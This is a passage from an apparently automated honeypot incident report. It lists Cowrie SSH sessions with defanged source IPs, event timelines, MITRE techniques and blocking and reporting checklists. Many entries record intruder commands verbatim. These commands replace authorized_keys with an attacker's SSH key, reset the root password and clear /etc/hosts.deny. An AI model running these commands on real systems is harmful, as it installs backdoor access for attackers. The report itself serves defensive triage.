- [ ] Submit `178.255.72[.]35` to AbuseIPDB if not already reported
- [ ] Block `178.255.72[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-616e4b518535

| Field | Detail |
|---|---|
| **Source IP** | `178.255.72[.]35` |
| **First Seen** | 2026-06-12 13:52 |
| **Last Seen** | 2026-06-12 13:52 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 13:52:45` | `cowrie.session.connect` |
| `2026-06-12 13:52:45` | `cowrie.client.version` |
| `2026-06-12 13:52:45` | `cowrie.client.kex` |
| `2026-06-12 13:52:46` | `cowrie.login.success` |
| `2026-06-12 13:52:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.255.72[.]35` to AbuseIPDB if not already reported
- [ ] Block `178.255.72[.]35` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-acd600b8fe90

| Field | Detail |
|---|---|
| **Source IP** | `114.220.176[.]69` |
| **First Seen** | 2026-06-12 13:53 |
| **Last Seen** | 2026-06-12 13:53 |
| **Session Duration** | 21s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:U7y2cYuSNH4j"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 13:53:16` | `cowrie.session.connect` |
| `2026-06-12 13:53:16` | `cowrie.client.version` |
| `2026-06-12 13:53:16` | `cowrie.client.kex` |
| `2026-06-12 13:53:16` | `cowrie.login.success` |
| `2026-06-12 13:53:17` | `cowrie.session.params` |
| `2026-06-12 13:53:17` | `cowrie.command.input` |
| `2026-06-12 13:53:17` | `cowrie.command.failed` |
| `2026-06-12 13:53:17` | `cowrie.log.closed` |
| `2026-06-12 13:53:17` | `cowrie.session.params` |
| `2026-06-12 13:53:17` | `cowrie.command.input` |
| `2026-06-12 13:53:17` | `cowrie.session.file_download` |
| `2026-06-12 13:53:17` | `cowrie.log.closed` |
| `2026-06-12 13:53:29` | `cowrie.session.params` |
| `2026-06-12 13:53:29` | `cowrie.command.input` |
| `2026-06-12 13:53:30` | `cowrie.log.closed` |
| `2026-06-12 13:53:30` | `cowrie.session.params` |
| `2026-06-12 13:53:30` | `cowrie.command.input` |
| `2026-06-12 13:53:30` | `cowrie.log.closed` |
| `2026-06-12 13:53:31` | `cowrie.session.params` |
| `2026-06-12 13:53:31` | `cowrie.command.input` |
| `2026-06-12 13:53:31` | `cowrie.session.file_download` |
| `2026-06-12 13:53:31` | `cowrie.log.closed` |
| `2026-06-12 13:53:31` | `cowrie.session.params` |
| `2026-06-12 13:53:31` | `cowrie.command.input` |
| `2026-06-12 13:53:31` | `cowrie.log.closed` |
| `2026-06-12 13:53:32` | `cowrie.session.params` |
| `2026-06-12 13:53:32` | `cowrie.command.input` |
| `2026-06-12 13:53:32` | `cowrie.log.closed` |
| `2026-06-12 13:53:32` | `cowrie.session.params` |
| `2026-06-12 13:53:32` | `cowrie.command.input` |
| `2026-06-12 13:53:32` | `cowrie.command.input` |
| `2026-06-12 13:53:32` | `cowrie.log.closed` |
| `2026-06-12 13:53:33` | `cowrie.session.params` |
| `2026-06-12 13:53:33` | `cowrie.command.input` |
| `2026-06-12 13:53:33` | `cowrie.log.closed` |
| `2026-06-12 13:53:33` | `cowrie.session.params` |
| `2026-06-12 13:53:33` | `cowrie.command.input` |
| `2026-06-12 13:53:33` | `cowrie.log.closed` |
| `2026-06-12 13:53:34` | `cowrie.session.params` |
| `2026-06-12 13:53:34` | `cowrie.command.input` |
| `2026-06-12 13:53:34` | `cowrie.log.closed` |
| `2026-06-12 13:53:34` | `cowrie.session.params` |
| `2026-06-12 13:53:34` | `cowrie.command.input` |
| `2026-06-12 13:53:34` | `cowrie.log.closed` |
| `2026-06-12 13:53:35` | `cowrie.session.params` |
| `2026-06-12 13:53:35` | `cowrie.command.input` |
| `2026-06-12 13:53:35` | `cowrie.log.closed` |
| `2026-06-12 13:53:35` | `cowrie.session.params` |
| `2026-06-12 13:53:35` | `cowrie.command.input` |
| `2026-06-12 13:53:35` | `cowrie.log.closed` |
| `2026-06-12 13:53:36` | `cowrie.session.params` |
| `2026-06-12 13:53:36` | `cowrie.command.input` |
| `2026-06-12 13:53:36` | `cowrie.log.closed` |
| `2026-06-12 13:53:36` | `cowrie.session.params` |
| `2026-06-12 13:53:36` | `cowrie.command.input` |
| `2026-06-12 13:53:36` | `cowrie.log.closed` |
| `2026-06-12 13:53:37` | `cowrie.session.params` |
| `2026-06-12 13:53:37` | `cowrie.command.input` |
| `2026-06-12 13:53:37` | `cowrie.log.closed` |
| `2026-06-12 13:53:37` | `cowrie.session.params` |
| `2026-06-12 13:53:37` | `cowrie.command.input` |
| `2026-06-12 13:53:37` | `cowrie.log.closed` |
| `2026-06-12 13:53:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `114.220.176[.]69` to AbuseIPDB if not already reported
- [ ] Block `114.220.176[.]69` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4328738685b8

| Field | Detail |
|---|---|
| **Source IP** | `171.25.158[.]80` |
| **First Seen** | 2026-06-12 13:53 |
| **Last Seen** | 2026-06-12 13:53 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 13:53:42` | `cowrie.session.connect` |
| `2026-06-12 13:53:42` | `cowrie.client.version` |
| `2026-06-12 13:53:42` | `cowrie.client.kex` |
| `2026-06-12 13:53:43` | `cowrie.login.success` |
| `2026-06-12 13:53:43` | `cowrie.session.params` |
| `2026-06-12 13:53:43` | `cowrie.command.input` |
| `2026-06-12 13:53:43` | `cowrie.command.failed` |
| `2026-06-12 13:53:43` | `cowrie.log.closed` |
| `2026-06-12 13:53:44` | `cowrie.session.params` |
| `2026-06-12 13:53:44` | `cowrie.command.input` |
| `2026-06-12 13:53:44` | `cowrie.session.file_download` |
| `2026-06-12 13:53:44` | `cowrie.log.closed` |
| `2026-06-12 13:53:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.25.158[.]80` to AbuseIPDB if not already reported
- [ ] Block `171.25.158[.]80` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b542c8c66f10

| Field | Detail |
|---|---|
| **Source IP** | `171.25.158[.]80` |
| **First Seen** | 2026-06-12 13:53 |
| **Last Seen** | 2026-06-12 13:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 13:53:47` | `cowrie.session.connect` |
| `2026-06-12 13:53:47` | `cowrie.client.version` |
| `2026-06-12 13:53:47` | `cowrie.client.kex` |
| `2026-06-12 13:53:48` | `cowrie.login.success` |
| `2026-06-12 13:53:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.25.158[.]80` to AbuseIPDB if not already reported
- [ ] Block `171.25.158[.]80` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-21dce8c11051

| Field | Detail |
|---|---|
| **Source IP** | `183.82.120[.]244` |
| **First Seen** | 2026-06-12 13:54 |
| **Last Seen** | 2026-06-12 13:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 13:54:34` | `cowrie.session.connect` |
| `2026-06-12 13:54:34` | `cowrie.client.version` |
| `2026-06-12 13:54:34` | `cowrie.client.kex` |
| `2026-06-12 13:54:34` | `cowrie.login.success` |
| `2026-06-12 13:54:34` | `cowrie.session.params` |
| `2026-06-12 13:54:34` | `cowrie.command.input` |
| `2026-06-12 13:54:34` | `cowrie.command.failed` |
| `2026-06-12 13:54:34` | `cowrie.log.closed` |
| `2026-06-12 13:54:34` | `cowrie.session.params` |
| `2026-06-12 13:54:34` | `cowrie.command.input` |
| `2026-06-12 13:54:34` | `cowrie.session.file_download` |
| `2026-06-12 13:54:34` | `cowrie.log.closed` |
| `2026-06-12 13:54:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.82.120[.]244` to AbuseIPDB if not already reported
- [ ] Block `183.82.120[.]244` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dab07dff0e2c

| Field | Detail |
|---|---|
| **Source IP** | `183.82.120[.]244` |
| **First Seen** | 2026-06-12 13:54 |
| **Last Seen** | 2026-06-12 13:54 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 13:54:35` | `cowrie.session.connect` |
| `2026-06-12 13:54:35` | `cowrie.client.version` |
| `2026-06-12 13:54:35` | `cowrie.client.kex` |
| `2026-06-12 13:54:35` | `cowrie.login.success` |
| `2026-06-12 13:54:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.82.120[.]244` to AbuseIPDB if not already reported
- [ ] Block `183.82.120[.]244` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9c114c55af36

| Field | Detail |
|---|---|
| **Source IP** | `185.99.99[.]95` |
| **First Seen** | 2026-06-12 13:55 |
| **Last Seen** | 2026-06-12 13:55 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 13:55:52` | `cowrie.session.connect` |
| `2026-06-12 13:55:52` | `cowrie.client.version` |
| `2026-06-12 13:55:52` | `cowrie.client.kex` |
| `2026-06-12 13:55:53` | `cowrie.login.success` |
| `2026-06-12 13:55:53` | `cowrie.session.params` |
| `2026-06-12 13:55:53` | `cowrie.command.input` |
| `2026-06-12 13:55:53` | `cowrie.command.failed` |
| `2026-06-12 13:55:53` | `cowrie.log.closed` |
| `2026-06-12 13:55:54` | `cowrie.session.params` |
| `2026-06-12 13:55:54` | `cowrie.command.input` |
| `2026-06-12 13:55:54` | `cowrie.session.file_download` |
| `2026-06-12 13:55:54` | `cowrie.log.closed` |
| `2026-06-12 13:55:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.99.99[.]95` to AbuseIPDB if not already reported
- [ ] Block `185.99.99[.]95` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-86e9a7ba4e1b

| Field | Detail |
|---|---|
| **Source IP** | `185.99.99[.]95` |
| **First Seen** | 2026-06-12 13:55 |
| **Last Seen** | 2026-06-12 13:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 13:55:56` | `cowrie.session.connect` |
| `2026-06-12 13:55:56` | `cowrie.client.version` |
| `2026-06-12 13:55:57` | `cowrie.client.kex` |
| `2026-06-12 13:55:57` | `cowrie.login.success` |
| `2026-06-12 13:55:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.99.99[.]95` to AbuseIPDB if not already reported
- [ ] Block `185.99.99[.]95` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5cfc3df9bc31

| Field | Detail |
|---|---|
| **Source IP** | `178.255.72[.]35` |
| **First Seen** | 2026-06-12 13:56 |
| **Last Seen** | 2026-06-12 13:56 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 13:56:22` | `cowrie.session.connect` |
| `2026-06-12 13:56:22` | `cowrie.client.version` |
| `2026-06-12 13:56:22` | `cowrie.client.kex` |
| `2026-06-12 13:56:22` | `cowrie.login.success` |
| `2026-06-12 13:56:23` | `cowrie.session.params` |
| `2026-06-12 13:56:23` | `cowrie.command.input` |
| `2026-06-12 13:56:23` | `cowrie.command.failed` |
| `2026-06-12 13:56:23` | `cowrie.log.closed` |
| `2026-06-12 13:56:23` | `cowrie.session.params` |
| `2026-06-12 13:56:23` | `cowrie.command.input` |
| `2026-06-12 13:56:23` | `cowrie.session.file_download` |
| `2026-06-12 13:56:23` | `cowrie.log.closed` |
| `2026-06-12 13:56:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.255.72[.]35` to AbuseIPDB if not already reported
- [ ] Block `178.255.72[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1d21b4e1ca3e

| Field | Detail |
|---|---|
| **Source IP** | `178.255.72[.]35` |
| **First Seen** | 2026-06-12 13:56 |
| **Last Seen** | 2026-06-12 13:56 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 13:56:25` | `cowrie.session.connect` |
| `2026-06-12 13:56:25` | `cowrie.client.version` |
| `2026-06-12 13:56:25` | `cowrie.client.kex` |
| `2026-06-12 13:56:26` | `cowrie.login.success` |
| `2026-06-12 13:56:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.255.72[.]35` to AbuseIPDB if not already reported
- [ ] Block `178.255.72[.]35` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-41aa5bddf4f6

| Field | Detail |
|---|---|
| **Source IP** | `178.255.72[.]35` |
| **First Seen** | 2026-06-12 13:58 |
| **Last Seen** | 2026-06-12 13:58 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 13:58:09` | `cowrie.session.connect` |
| `2026-06-12 13:58:09` | `cowrie.client.version` |
| `2026-06-12 13:58:10` | `cowrie.client.kex` |
| `2026-06-12 13:58:10` | `cowrie.login.success` |
| `2026-06-12 13:58:10` | `cowrie.session.params` |
| `2026-06-12 13:58:10` | `cowrie.command.input` |
| `2026-06-12 13:58:10` | `cowrie.command.failed` |
| `2026-06-12 13:58:11` | `cowrie.log.closed` |
| `2026-06-12 13:58:11` | `cowrie.session.params` |
| `2026-06-12 13:58:11` | `cowrie.command.input` |
| `2026-06-12 13:58:11` | `cowrie.session.file_download` |
| `2026-06-12 13:58:11` | `cowrie.log.closed` |
| `2026-06-12 13:58:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.255.72[.]35` to AbuseIPDB if not already reported
- [ ] Block `178.255.72[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c804adea3f89

| Field | Detail |
|---|---|
| **Source IP** | `178.255.72[.]35` |
| **First Seen** | 2026-06-12 13:58 |
| **Last Seen** | 2026-06-12 13:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 13:58:13` | `cowrie.session.connect` |
| `2026-06-12 13:58:13` | `cowrie.client.version` |
| `2026-06-12 13:58:13` | `cowrie.client.kex` |
| `2026-06-12 13:58:14` | `cowrie.login.success` |
| `2026-06-12 13:58:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.255.72[.]35` to AbuseIPDB if not already reported
- [ ] Block `178.255.72[.]35` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-be7634f38458

| Field | Detail |
|---|---|
| **Source IP** | `179.184.160[.]50` |
| **First Seen** | 2026-06-12 13:58 |
| **Last Seen** | 2026-06-12 13:58 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 13:58:18` | `cowrie.session.connect` |
| `2026-06-12 13:58:18` | `cowrie.client.version` |
| `2026-06-12 13:58:18` | `cowrie.client.kex` |
| `2026-06-12 13:58:20` | `cowrie.login.success` |
| `2026-06-12 13:58:20` | `cowrie.session.params` |
| `2026-06-12 13:58:20` | `cowrie.command.input` |
| `2026-06-12 13:58:20` | `cowrie.command.failed` |
| `2026-06-12 13:58:21` | `cowrie.log.closed` |
| `2026-06-12 13:58:21` | `cowrie.session.params` |
| `2026-06-12 13:58:21` | `cowrie.command.input` |
| `2026-06-12 13:58:22` | `cowrie.session.file_download` |
| `2026-06-12 13:58:22` | `cowrie.log.closed` |
| `2026-06-12 13:58:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.184.160[.]50` to AbuseIPDB if not already reported
- [ ] Block `179.184.160[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3aa9f3d886f4

| Field | Detail |
|---|---|
| **Source IP** | `179.184.160[.]50` |
| **First Seen** | 2026-06-12 13:58 |
| **Last Seen** | 2026-06-12 13:58 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 13:58:25` | `cowrie.session.connect` |
| `2026-06-12 13:58:25` | `cowrie.client.version` |
| `2026-06-12 13:58:26` | `cowrie.client.kex` |
| `2026-06-12 13:58:27` | `cowrie.login.success` |
| `2026-06-12 13:58:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.184.160[.]50` to AbuseIPDB if not already reported
- [ ] Block `179.184.160[.]50` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-86c79801e6d6

| Field | Detail |
|---|---|
| **Source IP** | `183.82.120[.]244` |
| **First Seen** | 2026-06-12 14:00 |
| **Last Seen** | 2026-06-12 14:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
